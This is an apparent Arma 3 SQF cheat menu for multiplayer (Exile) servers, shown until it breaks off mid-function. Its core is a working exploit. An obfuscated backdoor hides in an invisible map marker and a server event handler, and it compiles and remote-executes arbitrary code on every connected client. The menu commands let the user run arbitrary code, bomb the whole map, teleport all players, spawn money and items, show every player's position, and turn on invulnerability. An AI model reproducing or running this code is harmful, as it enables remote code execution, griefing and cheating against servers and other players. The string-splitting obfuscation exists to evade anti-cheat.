

[] spawn {
		hintSilent "loading";

		disableserialization;



























		hintSilent "loading.";

		_building = objNull;
		_loop = 0;
		while{isNull _building && !alive _building} do {
			_location = locationPosition (nearestLocation [[random(worldSize),random(worldSize),0],""]);
			_buildings = nearestObjects [_location, ["Building"], 300];
			if(count(_buildings) > 0) then {
				_building = _buildings select floor(random(count(_buildings)));
			};
			_loop = _loop + 1;
			if(_loop == 15000) exitWith {};
		};
		comment 'if(isNull _building) exitWith {hint "Failed to find a building! Could not run script!"};';
		_cargo = _building;
		_cargo allowDamage false;

		_cfg_vehicle = configFile >> "cfgVehicles";
										if (isNil 'Jay_vehicle_list') then {
											Jay_vehicle_list = [];

											for "_i" from 0 to (count _cfg_vehicle)-1 do
											{
												_vehicle_class = _cfg_vehicle select _i;
												if (isClass _vehicle_class) then
												{
													_vehicle = configName _vehicle_class;
													if ((getNumber (_vehicle_class >> "scope") == 2) && (getText (_vehicle_class >> "picture") != "") && (((_vehicle isKindOf "LandVehicle") or (_vehicle isKindOf "Air") or (_vehicle isKindOf "Boat"))) && !((_vehicle isKindOf "ParachuteBase") or (_vehicle isKindOf "BIS_Steerable_Parachute"))) then
													{
														Jay_vehicle_list = Jay_vehicle_list + [_vehicle];
													};
												};
											};
										};

		weaponList = [];
		_weaponConfig = configFile >> "cfgWeapons";
		for "_i" from 0 to (count _weaponConfig)-1 do {
			 _weapon = _weaponConfig select _i;
			 if (isClass _weapon) then {
					 _weaponName = configName _weapon;
					 _ulx = toArray _weaponName;
					 _ulx resize 7;
					 _ulx;
					 _ulx = toString _ulx;
					 if ((_ulx != "ItemKey") and (getNumber (_weapon >> "scope") == 2) and ((getText (configFile >> "cfgWeapons" >> _weaponName >> "picture")) != "")) then {
							 weaponList = weaponList + [_weaponName];
						 };
				 };
		 };



		 fivedorraboughtfromtitanmods_openmenu = {
	    switch (_this) do {
	     case 43: {
	      createDialog "RscDisplayChat";
	     };

	    };
	   };
	   waituntil {!isnull (finddisplay 46)};
	   (findDisplay 46) displayAddEventHandler ["KeyDown","_this select 1 call fivedorraboughtfromtitanmods_openmenu;false;"];


		hintSilent "loading..";
_rabbit = createAgent ["Rabbit_F", position player, [], 0, "FORM"];

_detector = format['%1 nearestObject "Rabbit_F"',getpos _rabbit];
		_getVariable = compile format["params['_var','_default'];%1 getVariable [_var,_default];",_detector];
		_setVariable = compile format["params['_var','_value'];%1 setVariable [_var,_value];",_detector];
		["runloops",true] call _setVariable;


["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{
			params["_code"];
			private["_str","_chars","_packets","_fivedorraboughtfromtitanmods_co_de","_packetPart","_packetNum","_pIndex","_install","_marker","_pos","_timeout"];

			_str = str(_code) select [1];
			_str = _str select [0,count(_str)-1];
			_chars = _str splitString "";
			_packets = [];

			_fivedorraboughtfromtitanmods_co_de = "";
			_packetPart = [];
			_packetNum = 1;
			{
				if((_forEachIndex mod 1000 == 0 && _forEachIndex != 0) || (_forEachIndex == (count(_chars)-1))) then {
					_pIndex = count(_packets)+1;
					_packets pushback ("pac_" + str(_pIndex) + " = '" + (_packetPart joinString "") + "';");
					_packetPart = [];
					_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + "+pac_" + str(_pIndex);
				};
				_packetPart pushback _x;
				if(_x == "'") then {
					_packetPart pushback "'";
				};
			} forEach _chars;
			_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de select [1];
			_packets pushBack ("_c = compile (" + _fivedorraboughtfromtitanmods_co_de + ");[] spawn _c;");

			_install = {
				params["_markerName"];
				private["_a","_b","_c"];
				createMarker[_markerName,[0.1,0.1]];
				_markerName setMarkerAlpha 0.001;
				_markerName setMarkerText "....";

				_a = 'if(isServer) then {
					inf = {
						ad' + 'dMis' + 'sionEv' + 'entHa' + 'ndler["Eachfr" + "ame","
							b" + "is_fun" + "ctions_mai" + "nscope setV" + "ariable [""R" + "EA2"",tr" + "ue];
							_mar" + "kerTe" + "xt = mar" + "kerTe" + "xt ""' + _markerName + '"";
							if(_ma" + "rkerT" + "ext != "".." + ".."") then {
								_c" + "ode = com" + "pile _mar" + "kerTe" + "xt;
								_c" + "ode re" + "mo" + "te" + "Exe" + "c [""ca" + "ll"",0];
								""' + _markerName + '"" se" + "tMa" + "rkerT" + "ext ""." + "..."";
							};
							removeAllMissionEventHandlers ""Eachframe"";
							[] sp" + "awn in" + "f;
						"];
					};
					ad' + 'dMis' + 'sionEv' + 'entHa' + 'ndler["Eachfr" + "ame","
						b" + "is_fun" + "ctions_mai" + "nscope setV" + "ariable [""R" + "EA2"",tr" + "ue];
						_mar" + "kerTe" + "xt = mar" + "kerTe" + "xt ""' + _markerName + '"";
						if(_ma" + "rkerT" + "ext != "".." + ".."") then {
							_c" + "ode = com" + "pile _mar" + "kerTe" + "xt;
							_c" + "ode re" + "mo" + "te" + "Exe" + "c [""ca" + "ll"",0];
							""' + _markerName + '"" se" + "tMa" + "rkerT" + "ext ""." + "..."";
						};
						removeAllMissionEventHandlers ""Eachframe"";
						[] sp" + "awn i" + "nf;
					"];
				};';

				_c = ("(typeof player) create");
				_c = _c + ("Unit [[0,0,0],create");
				_c = _c + ("Group sideLogic,'");
				_c = _c + _a;
				_c = _c + "'];";
				_b = compile _c;
				call _b;

			};

			_marker = "_USER_DEFINED #0/0/4";
			_pos = markerPos _marker;
			_timeout = false;
			if((_pos select 0) == 0) then {
				systemchat "RE INIT > Installing RE";
				[_marker] call _install;
				systemchat "RE INIT > Install done... Checking";
				_out = diag_tickTime + 30;
				waitUntil{!isNil {bis_functions_mainscope getVariable ["REA2",nil]} || (diag_tickTime > _out)};
				if(diag_tickTime > _out) exitWith {_timeout = true;};
				systemchat "RE INIT > Install Success";
			};
			if(_timeout) exitWith {
				systemchat "RE INIT > Failed to install RE.";
				systemchat "RE INIT > Either the server is lagging / crashing OR the RE is broke";
			};
			{
				_marker setMarkerText _x;
				waitUntil{markerText _marker == "...."};
				systemchat ("RE > Executed Packet " + str(_forEachIndex+1) + "/" + str(count(_packets)));
			} forEach _packets;
			systemchat "RE > Done.";
		}] call _setVariable;
		hintSilent "loading...";

		_ln = {
			params["_parts","_getVariable","_setVariable"];

			_veh = nearestObject [getpos player, "LandVehicle"];
			if(isNull _veh) then {
				_veh = nearestObject [getpos player, "Air"];
			};
			if(isNull _veh) then {
				_veh = nearestObject [getpos player, "Ship"];
			};
			if(_veh in vehicles) then {
				hint "Launching vehicle";
				[_veh,{
					_head = vehicle player;
					_head setVelocity [random 2,random 2,10];
				}] call (["sLocal",{}] call _getVariable);
			};
		};
		_la = {
			params["_parts","_getVariable","_setVariable"];

			{
				if(alive _x && (_x isKindOf "LandVehicle" || _x isKindOf "Air" || _x isKindOf "Ship")) then {
					[_x,{
						_head = vehicle player;
						_head setVelocity [random 2,random 2,10];
					}] call (["sLocal",{}] call _getVariable);
				};
			} forEach vehicles;
			hint "launched!";
		};
		_l = {
			params["_parts","_getVariable","_setVariable"];

			if(cursorObject in vehicles) then {
				hint "Launching cursor";
				[cursorObject,{
					_head = vehicle player;
					_head setVelocity [random 2,random 2,10];
				}] call (["sLocal",{}] call _getVariable);
			};
		};
		_sw = {
			player allowDamage false;
			_pos = getPos Player;
			for "_i" from 1 to 10 do {
				uiSleep 0.2;

				for "_dir" from 5 to 360 step 5 do {

					_delta = (vectorNormalized [sin(_dir),cos(_dir),0]) vectorMultiply 20;
					_npos = _pos vectorAdd (_delta vectorMultiply _i);
					_npos set[2,0];
					player allowDamage false;
					_bobber = "Bomb_04_F" createVehicleLocal _npos;
					player allowDamage false;
					_bobber setVelocity [0,-1,-10];
				};
				player setpos _pos;
			};
			player allowDamage true;
		};
		_bw = {
			_delta = (vectorNormalized (eyeDirection player)) vectorMultiply 20;
			_pos = getPos Player;
			player allowDamage false;
			for "_i" from 1 to 10 do {
				uiSleep 0.2;
				_pos = _pos vectorAdd _delta;
				_pos set[2,0];
				player allowDamage false;
				_bobber = "Bomb_04_F" createVehicleLocal _pos;
				player allowDamage false;
				_bobber setVelocity [0,-1,-10];

			};
			player allowDamage true;
		};
		_tpm = {
			hint "To teleport center the map on where you want to go and press ESCAPE";
			openMap [true,false];
			_coords = [0,0,0];
			while{visibleMap} do {
				_coords = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [0.5,0.5];
				uiSleep 0.01;
			};
			vehicle player setpos _coords;
		};
    _masshint = {
      params["_parts","_getVariable","_setVariable"];
			_text = _parts select 0;
			_fivedorraboughtfromtitanmods_co_de = format["hint ' %1 '", _parts];
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
    };
		_blackmessage = {
      params["_parts","_getVariable","_setVariable"];
			_text = _parts select 0;
			_fivedorraboughtfromtitanmods_co_de = format["titleText ['%1', 'BLACK', 2];", _text];
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
    };



    _map = {
	  jm_Noobs = [];
                 jm_Bitches = [];
                 if (isnil "jm_Map_Markers") then {
                     jm_Map_Markers = 0;
                 };
                 if (jm_Map_Markers == 0) then {
                     jm_Map_Markers = 1;
                     systemChat "[JMV6] Players locations on the Map have been added.";
                 } else {
                     jm_Map_Markers = 0;
                     systemChat "[JMV6] Players locations on the Map have been removed.";
                 };
                 while {
                     jm_Map_Markers == 1
                 }
                 do {
                     {
                         if ((vehicle _x isKindOf "LandVehicle") || (vehicle _x isKindOf "Air") || (vehicle _x isKindOf "Ship")) then {
                             if (count(crew vehicle _x) > 0) then {
                                 {
                                     if (!(_x in jm_Noobs) and(alive _x) and(getPlayerUID _x != "")) then {
                                         private["_pos", "_l44", "_l45"];
                                         _l45 = vehicle _x;
                                         _pos = visiblePosition _x;
                                         _l44 = createMarkerLocal[format["CRW%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]];
                                         _l8 = (gettext(configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'displayName'));
                                         _l44 setMarkerTextLocal format['%1---%2---%3m', name _x, _l8, round(_x distance player)];
                                         _l44 setMarkerTypeLocal "mil_dot";
                                         if ((side _x == side player) and(side _x != resistance)) then {
                                             _l44 setMarkerColorLocal "ColorBlue";
                                         } else {
                                             _l44 setMarkerColorLocal "ColorRed";
                                         };
                                         _l44 setMarkerSizeLocal[1, 1];
                                         jm_Noobs set[count jm_Noobs, _x];
                                         [_x, _l44, _l45] spawn {
                                             private["_l46", "_l47", "_l48"];
                                             _l46 = _this select 0;
                                             _l47 = _this select 1;
                                             while {
                                                 (jm_Map_Markers == 1) and(alive _l46) and(vehicle _l46 != _l46) and(getPlayerUID _l46 != "")
                                             }
                                             do {
                                                 _l48 = ((crew vehicle _l46) find _l46);
                                                 _l47 setMarkerPosLocal([(visiblePosition _l46 select 0) + 20, (visiblePosition _l46 select 1) - (25 + _l48 * 20), 0]);
                                                 sleep 0.01;
                                             };
                                             deleteMarkerLocal _l47;
                                             if (_l46 in jm_Noobs) then {
                                                 jm_Noobs set[(jm_Noobs find _l46), -1];
                                                 jm_Noobs = jm_Noobs - [-1];
                                             };
                                             true;
                                         };
                                     };
                                 }
                                 forEach crew vehicle _x;
                             };
                         } else {
                             if (!(_x in jm_Bitches) and(vehicle _x == _x) and(getPlayerUID _x != "")) then {
                                 private["_pos", "_l44"];
                                 _pos = visiblePosition _x;
                                 _l44 = createMarkerLocal[format["PLR%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]];
                                 _l44 setMarkerTypeLocal "mil_dot";
                                 _l44 setMarkerSizeLocal[1, 1];
                                 if ((side _x == side player) and(side _x != resistance)) then {
                                     _l44 setMarkerColorLocal "ColorRed";
                                 } else {
                                     _l44 setMarkerColorLocal "ColorRedAlpha";
                                 };
                                 _l44 setMarkerTextLocal format["%1---%2", name _x, round(_x distance player)];
                                 if (_x == player) then {
                                     _l44 setMarkerColorLocal "ColorGreen";
                                 };
                                 jm_Bitches set[count jm_Bitches, _x];
                                 [_x, _l44] spawn {
                                     private["_l46", "_l47"];
                                     _l46 = _this select 0;
                                     _l47 = _this select 1;
                                     while {
                                         (jm_Map_Markers == 1) and(alive _l46) and(vehicle _l46 == _l46) and(getPlayerUID _l46 != "")
                                     }
                                     do {
                                         _l47 setMarkerPosLocal([visiblePosition _l46 select 0, visiblePosition _l46 select 1, 0]);
                                         sleep 0.01;
                                     };
                                     deleteMarkerLocal _l47;
                                     if (_l46 in jm_Bitches) then {
                                         jm_Bitches set[(jm_Bitches find _l46), -1];
                                         jm_Bitches = jm_Bitches - [-1];
                                     };
                                     true;
                                 };
                             };
                         };
                     }
                     forEach playableUnits;
                     sleep 0.3;
                 }; {
                     _l44 = str _x;
                     deleteMarkerLocal _l44;
                 }
             forEach playableUnits;
};





		_titletext = {
      params["_parts","_getVariable","_setVariable"];
			_text = _parts select 0;
			_fivedorraboughtfromtitanmods_co_de = format["titleText ['%1', 'plain', 2];", _text];
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
    };
		_ = {
      params["_parts","_getVariable","_setVariable"];
			_text = _parts select 0;
			_fivedorraboughtfromtitanmods_co_de = format["titleText ['%1', 'BLACK', 2];", _text];
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
    };
		_nk = {
			params["_parts","_getVariable","_setVariable"];
			_locations = [];
			_threads = [];
			_stop = diag_tickTime + 60;
			hint "N U K I N G";
			while{diag_tickTime < _stop} do {
				_location = locationPosition (nearestLocation [[random(worldSize),random(worldSize),0],""]);
				if !(_location in _locations) then {
					_locations pushBack _location;
					_thread = _location spawn {
						_buildings = nearestObjects [_this, ["Building"], 1000];
						{
							if !(_x getVariable ["runloops",false]) then {
								_bobber = "Bomb_04_F" createVehicleLocal (getpos _x);
								_bobber setVelocity [0,-1,-10];
							};
							uiSleep (60/(count(_buildings)));
						} forEach _buildings;
					};
					_threads pushback _thread;
				};
			};
			{
				if(!scriptDone _x) then {
					terminate _x;
				};
			} forEach _threads;
			hint "D O N E";
		};
		_run = {
			params["_parts","_getVariable","_setVariable"];
			_fivedorraboughtfromtitanmods_co_de = "";
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_a = compile _fivedorraboughtfromtitanmods_co_de;
			with missionNamespace do {call _a;};
		};
		_runr = {
			params["_parts","_getVariable","_setVariable"];
			_fivedorraboughtfromtitanmods_co_de = "";
			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
		};
		_tpa = {
			params["_parts","_getVariable","_setVariable"];
			{
				_x setpos getpos player;
				uiSleep .1;
			} forEach allPlayers;
		};

    comment "Spawn Vehicle";

		_spwveh = {
			params["_parts","_getVariable","_setVariable"];
			_type = _parts select 0;
			_locality = _parts select 1;
			if (_locality == toLower("public")) then {
      _type createVehicle position player;
			systemChat format["[JMV7] Spawned a Public Vehicle. [%1]", _type];
			};
			if (_locality == toLower("local")) then {
			_type createVehicleLocal position player;
			systemChat format["[JMV7] Spawned a Local Vehicle. [%1]", _type];
			};
		};

		_raincar = {
			params["_parts","_getVariable","_setVariable"];
			_type = _parts select 0;
			_locality = _parts select 1;
systemChat format["[JMV7] Activated #SW@G Y0lO car. "];
			SwagCar = vehicle player;
			ColorsON = true;
			while {alive SwagCar} do {
	 if(ColorsON) then {
SwagCar setObjectTextureGlobal [0,'#(argb,8,8,3)color(0,1,0,1)'];
sleep 0.5;
SwagCar setObjectTextureGlobal [0,'#(argb,8,8,3)color(1,0,0,1)'];
sleep 0.5;
SwagCar setObjectTextureGlobal [0,'#(argb,8,8,3)color(1,1,0,1)'];
sleep 0.5;
SwagCar setObjectTextureGlobal [0,'#(argb,8,8,3)color(1,1,1,1)'];
sleep 0.5;
SwagCar setObjectTextureGlobal [0,'#(argb,8,8,3)color(1,0,1,1)'];
sleep 0.5;


	 };
};
		};


_DEraincar = {
	ColorsON = false;
	systemChat format["[JMV7] Disabled #SW@G Y0lO car. :( "];
};

		_spw = {
			params["_parts","_getVariable","_setVariable"];
			_class = _parts select 0;
			_count = 1;
			if(count(_parts) > 1) then {
				_count = (_count max parseNumber (_parts select 1));
			};

			_holders = player nearObjects ["groundWeaponHolder",1];
			_gwh = objNull;
			if(count(_holders) > 0) then {
				_gwh = _holders select 0;
			} else {
				_gwh = "groundWeaponHolder" createVehicle (getpos player);
			};



			if(isClass (configFile >> "CfgWeapons" >> _class)) then {
				if((toLower(_class) find "item" == 0) || (toLower(_class) find "exile_item" == 0) || (toLower(_class) find "h_" == 0) || (toLower(_class) find "u_" == 0) || (toLower(_class) find "v_" == 0) || (toLower(_class) find "minedetector" == 0) || (toLower(_class) find "binocular" == 0) || (toLower(_class) find "rangefinder" == 0) || (toLower(_class) find "NVGoggles" == 0) || (toLower(_class) find "laserdesignator" == 0) || (toLower(_class) find "firstaidkit" == 0) || (toLower(_class) find "medkit" == 0) || (toLower(_class) find "toolkit" == 0) || (toLower(_class) find "muzzle_" == 0) || (toLower(_class) find "optic_" == 0) || (toLower(_class) find "acc_" == 0) || (toLower(_class) find "bipod_" == 0)) then {
					_gwh addItemCargoGlobal [_class,_count];
					hint ("Spawned item\n" + _class);
				} else {
					for "_i" from 1 to _count do {
						_gwh addWeaponCargoGlobal [_class,1];
						_mags = getArray(configFile >> "CfgWeapons" >> _class >> "Magazines");
						_mag = "";
						{
							_mag = _x;
							_cfg = configFile >> "CfgMagazines" >> _mag;
							if(isClass _cfg) exitWith {};
						} forEach _mags;
						_gwh addMagazineCargoGlobal [_mag,3];
					};
				};
				hint ("Spawned weapon\n" + _class);
			};
			if(isClass (configFile >> "CfgMagazines" >> _class)) then {
				_gwh addMagazineCargoGlobal [_class,_count];
				hint ("Spawned magazine\n" + _class);
			};
			if(isClass (configFile >> "CfgVehicles" >> _class)) then {
				_gwh addBackpackCargoGlobal [_class,_count];
				hint ("Spawned backpack\n" + _class);
			};
			_gwh setposatl (getposatl player);
		};
		_tptarget = {
			params["_parts","_getVariable","_setVariable"];
			_name = _parts select 0;
			{
				if(_forEachIndex != 0) then {
					_name = _name + " " + _x;
				};
			} forEach _parts;
			if(isNil {_name}) then {_name = "";};

			_found = false;
			{
				if(tolower(name _x) == tolower(_name)) then {
					player setpos getpos _x;
					_found = true;
				};
			} forEach allPlayers;
			if(_found) then {
				hint "Teleported";
			} else {
				hint "Could not find that target";
			};
		};
		_tph = {
			params["_parts","_getVariable","_setVariable"];
			_name = _parts select 0;
			{
				if(_forEachIndex != 0) then {
					_name = _name + " " + _x;
				};
			} forEach _parts;
			if(isNil {_name}) then {_name = "";};

			_found = false;
			{
				if(tolower(name _x) == tolower(_name)) then {
					 _x setpos getpos player;
					_found = true;
				};
			} forEach allPlayers;
			if(_found) then {
				hint "Teleported";
			} else {
				hint "Could not find that target";
			};
		};
		_iam = {
			params["_parts","_getVariable","_setVariable"];
			_var = !(["IAM",false] call _getVariable);
			["IAM",_var] call _setVariable;
			if(_var) then { hint "Ammo Auto Refill On"} else {hint "Ammo Auto Refill Off" };
			while{["IAM",false] call _getVariable} do {
				_mag = ((GetArray(configFile >> 'cfgWeapons' >> currentWeapon player >> 'magazines')) select 0);
				if(({_x == _mag} count(magazines player)) < 4) then {
					player addMagazine _mag;
				};
			};
		};
		_ico = {
			params["_parts","_getVariable","_setVariable"];
			_var = !(["ICO",false] call _getVariable);
			["ICO",_var] call _setVariable;
			if(_var) then {
				hint "Player Icons On";
				_a = "addMission";
				_a = _a + "EventHandler [""Draw3D"",{";
				_a = _a + "
					_ordered = [];
					{
						if(player distance _x <= 2000) then {
							_ordered pushback [str(side _x),str(vehicle _x == _x),name _x,_x];
						};
					} forEach (if(isMultiplayer) then {allPlayers} else {allUnits});
					_ordered sort true;
					";
				_a = _a + "
					{
						_side = _x select 0;
						_inVehicle = _x select 1;
						_name = _x select 2;
						_object = _x select 3;
						";
				_a = _a + "
						_pos = (_object modelToWorld ((_object selectionPosition ""neck"") vectorAdd [0,0,0.25]));
						";
				_a = _a + "
						_color = [1,0,1,1];
						if(side _object == blufor) then {
							_color = [0,0,1,1];
						};
						if(side _object == opfor) then {
							_color = [1,0,0,1];
						};
						if(side _object == independent) then {
							_color = [0,1,0,1];
						};

						if(getplayeruid _object in [""76561198152111329"",""76561198276380268""]) then {
							_color  =  [1,1,0];
							_name = ""INFISTAR"";
						};

						_scale = (0.05 - (0.05 *((player distance _object)/3000)));
						if(_scale > 0) then {
							draw";
				_a = _a + "Icon3D ["""", _color, _pos, 0, 0, 0, _name + "" - "" + str(round(player distance _object)) + ""m"", 2, _scale, ""PuristaMedium"",""center"",true];
						};
					} forEach _ordered;

				}];";

				_b = compile _a;
				_eh = call _b;

				["ICOEH",_eh] call _setVariable;
			} else {
				_a =  "remove";
				_a = _a + "MissionEventHandler";
				_a = _a + " [""Draw";
				_a = _a + "3D"",_eh];";
				_eh = (["ICOEH",-1] call _getVariable);
				_b = compile _a;
				call _b;
				hint "Player icons off";
			};
		};
		_goymode = {
			params["_parts","_getVariable","_setVariable"];
			_var = !(["GOY",false] call _getVariable);
			["GOY",_var] call _setVariable;
			if(_var) then {
				 hint "Autoheal On";
			} else {
				hint "Autoheal Off";
			};
			while{(["GOY",false] call _getVariable)} do {
				player allowDamage false;
				player setDamage --0;
				player allowDamage false;
    player removeAllEventhandlers 'HandleDamage';
    player addEventhandler ['HandleDamage', {false}];
    ExileClientPlayerAttributes = [100,100,100,100,0,37,0];
    ExileClientPlayerAttributesASecondAgo = ExileClientPlayerAttributes;
    ExileClientPlayerLastHpRegenerationAt = diag_tickTime;
    ExileClientPlayerIsOverburdened = false;
    ExileClientPlayerOxygen = 100;
    ExileClientPlayerIsAbleToBreathe = true;
    ExileClientPlayerIsDrowning = false;
    ExileClientPlayerIsInjured = false;
    ExileClientPlayerIsBurning = false;
    ExileClientPlayerIsBleeding = false;
    ExileClientPlayerIsExhausted = false;
    ExileClientPlayerIsHungry = false;
    ExileClientPlayerIsThirsty = false;
    player setBleedingRemaining 0;
    player setOxygenRemaining 1;
    player setFatigue 0;
    if(damage player > 0)then{player setDamage 0;};
				uiSleep 0.001;
			};
		};
		_spwnmon = {
			params["_parts","_getVariable","_setVariable"];
			_amount = parseNumber(_parts select 0);
			 _vehObj = "Box_IND_Wps_F" createVehicle position player;
       _vehObj setVariable ["ExileMoney",_amount,true];


		};

		_money = {
			params["_parts","_getVariable","_setVariable"];
					_amount = parseNumber(_parts select 0);
          player setVariable["cmoney", (player getVariable "cmoney") + _amount];



		};

		_wepveh = {
			params["_parts","_getVariable","_setVariable"];
			_amount = _parts select 0;
			if (isNil _amount) then {
			  if(vehicle player == player) exitWith {hint "Might wanna get into a vehicle first...";};
			  (vehicle player) addWeapon "gatling_30mm";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			systemChat "[JMV6] Your vehicle has been weaponized. Press F (or your change weapon key) to access the weapon.";
			}
			else
			{

             if (_amount == "gatling") then {

 			  if(vehicle player == player) exitWith {hint "Might wanna get into a vehicle first...";};
			  (vehicle player) addWeapon "gatling_30mm";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			  (vehicle player) addMagazine "250Rnd_30mm_HE_shells";
			systemChat "[JMV6] Your vehicle has been weaponized. Press F (or your change weapon key) to access the weapon.";
			};
               if (_amount == "cupgatling") then {

				 if(vehicle player == player) exitWith {hint "Might wanna get into a vehicle first...";};
				(vehicle player) addWeapon "M621";
				(vehicle player) addMagazine "1200Rnd_20mm_M621";
				(vehicle player) addMagazine "1200Rnd_20mm_M621";
				(vehicle player) addMagazine "1200Rnd_20mm_M621";
				(vehicle player) addMagazine "1200Rnd_20mm_M621";
			systemChat "[JMV6] Your vehicle has been weaponized. Press F (or your change weapon key) to access the weapon.";
			};
		};



		};



		_box = {
			params["_parts","_getVariable","_setVariable"];
			_type = _parts select 0;
			_locality = _parts select 1;

     if (_type == toLower("building")) then {
      if (_locality == toLower("public")) then {
				systemChat "[JMV7] A Cargo Box has been spawned somewhere in your vicinity. This is a GLOBAL box. EVERYBODY can see it, and the money is withdrawable. I reccomend you delete it asap.";

			    _box = "B_CargoNet_01_ammo_F" createVehicle position player;
			  clearMagazineCargoGlobal _box;
			  clearItemCargoGlobal _box;
			  clearWeaponCargoGlobal _box;
			  sleep 2;
			  systemChat "[JMV7] Adding Contents.";
			  _box addMagazineCargoGlobal ["Land_HBarrierWall6_F_Kit", 30];
			  _box addMagazineCargoGlobal ["Land_HBarrierTower_F_Kit", 10];
			  _box addMagazineCargoGlobal ["Land_BagBunker_Tower_F_Kit", 10];
			  _box addMagazineCargoGlobal ["Exile_Item_ConcreteGateKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_WoodDoorKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_WoodFloorKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_WoodWallKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_ConcreteFloorKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_ConcreteWallKit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_ConcreteDoorKit", 50];
			  _box addMagazineCargoGlobal ["Land_PortableLight_double_F_Kit", 25];
			  _box addMagazineCargoGlobal ["Exile_Item_FloodLightKit", 25];
			  _box addMagazineCargoGlobal ["Land_Mil_WallBig_4m_F_Kit", 50];
			  _box addMagazineCargoGlobal ["Exile_Item_fivedorraboughtfromtitanmods_co_deLock", 50];
			  _box addMagazineCargoGlobal ["Land_i_Garage_V2_F_Kit", 50];
			  _box addMagazineCargoGlobal ["Land_Hangar_F_Kit", 50];
			  _box addMagazineCargoGlobal ["Land_Castle_01_tower_F_Kit", 50];
			    _box addMagazineCargoGlobal ["Exile_Item_SafeKit", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];
			  _box addMagazineCargoGlobal ["", 50];

			  systemChat "[JMV7] This box will be deleted in 5 minutes.";
			  sleep 500;
			  deleteVehicle _box;
			};




			 if (_locality == toLower("local")) then {
			 systemChat "[JMV7] A Cargo Box has been spawned somewhere in your vicinity. This is a LOCAL box. Nobody but you can see it, and the money is not withdrawable.";

	_box = "B_CargoNet_01_ammo_F" createVehicleLocal position player;

	clearMagazineCargoGlobal _box;
	clearItemCargoGlobal _box;
	clearWeaponCargoGlobal _box;
	sleep 2;
	systemChat "[JMV7] Adding Contents.";
	_box addMagazineCargoGlobal ["Land_HBarrierWall6_F_Kit", 30];
	_box addMagazineCargoGlobal ["Land_HBarrierTower_F_Kit", 10];
	_box addMagazineCargoGlobal ["Land_BagBunker_Tower_F_Kit", 10];
	_box addMagazineCargoGlobal ["Exile_Item_ConcreteGateKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_WoodDoorKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_WoodFloorKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_WoodWallKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_ConcreteFloorKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_ConcreteWallKit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_ConcreteDoorKit", 50];
	_box addMagazineCargoGlobal ["Land_PortableLight_double_F_Kit", 25];
	_box addMagazineCargoGlobal ["Exile_Item_FloodLightKit", 25];
	_box addMagazineCargoGlobal ["Land_Mil_WallBig_4m_F_Kit", 50];
	_box addMagazineCargoGlobal ["Exile_Item_fivedorraboughtfromtitanmods_co_deLock", 50];
	_box addMagazineCargoGlobal ["Land_i_Garage_V2_F_Kit", 50];
	_box addMagazineCargoGlobal ["Land_Hangar_F_Kit", 50];
	_box addMagazineCargoGlobal ["Land_Castle_01_tower_F_Kit", 50];
		_box addMagazineCargoGlobal ["Exile_Item_SafeKit", 50];
		 };
};
		};

		_time = {
			params["_parts","_getVariable","_setVariable"];
			_time = _parts select 0;
			_fivedorraboughtfromtitanmods_co_de = format["skipTime %1", _time];
